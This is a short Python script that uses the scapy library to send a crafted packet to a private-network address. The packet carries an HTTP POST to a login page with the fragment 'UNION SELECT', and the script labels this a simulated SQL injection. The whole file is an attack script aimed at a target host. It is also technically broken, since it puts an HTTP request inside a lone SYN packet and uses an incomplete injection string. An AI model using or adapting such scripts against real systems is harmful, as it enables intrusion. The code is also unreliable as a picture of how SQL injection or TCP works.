from scapy.all import send
from scapy.layers.inet import IP, TCP 
from scapy.packet import Raw

def sql_injection(target_ip, target_port):
    payload = "UNION SELECT"
    
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, sport=12345, flags="S")
    raw = Raw(load=f"POST /login HTTP/1.1\r\nHost: {target_ip}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(payload)}\r\n\r\n{payload}")

    packet = ip/tcp/raw
    send(packet, verbose=0)
    print(f"SQL Injection simulated on {target_ip}:{target_port} with payload: {payload}")


target_ip = "192.168.1.66"
target_port = 10000

sql_injection(target_ip, target_port)
